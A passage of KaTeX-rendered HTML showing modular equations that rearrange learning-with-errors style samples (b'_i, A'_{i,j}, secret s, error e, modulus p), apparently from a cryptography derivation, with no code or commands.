mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op"></span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op"></span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext></mtext><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msub><mi>b</mi><mi>i</mi></msub><mo></mo><munderover><mo></mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></munderover><mo stretchy="false">(</mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b&#x27;_{i}\equiv b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op"></span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext></mtext><msubsup><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo></mo><msub><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo separator="true">,</mo><mn>0</mn></mrow></msub><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A&#x27;_{i,j}\equiv A_{i,j,1}-A_{i,j,0}\pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185em;vertical-align:-0.383108em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext></mtext><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><mrow><mo fence="true">(</mo><munderover><mo></mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></munderover><msubsup><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msub><mi>s</mi><mi>j</mi></msub><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b&#x27;_i \equiv \left( \sum_{j=0}^{n-1} A&#x27;_{i, j} \cdot s_j + e_i \right) \pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.2148900000000005em;vertical-align:-1.4137769999999998em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8011130000000006em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op"></span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:1.4137769999999998em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext></mtext><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msubsup><mi>A</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msub><mi>s</mi><mi>j</mi></msub><mo>+</mo><msub><mi>e</mi><mi>i</mi></msub><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">b&#x27;_{i}\equiv A&#x27;_{i}\cdot s_{j}+e_{i} \pmod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext></mtext><msubsup><mi>A</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msub><mi>s</mi><mi>j</mi></msub><mo></mo><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo>=</mo><mo></mo><msub><mi>e</mi><mi>i</mi></msub><mo>+</mo><msub><mi>K</mi><mi>i</mi></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">A&#x27;_{i}\cdot s_{j}-b&#x27;_{i}=-e_{i}+K_{i}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.048892em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" 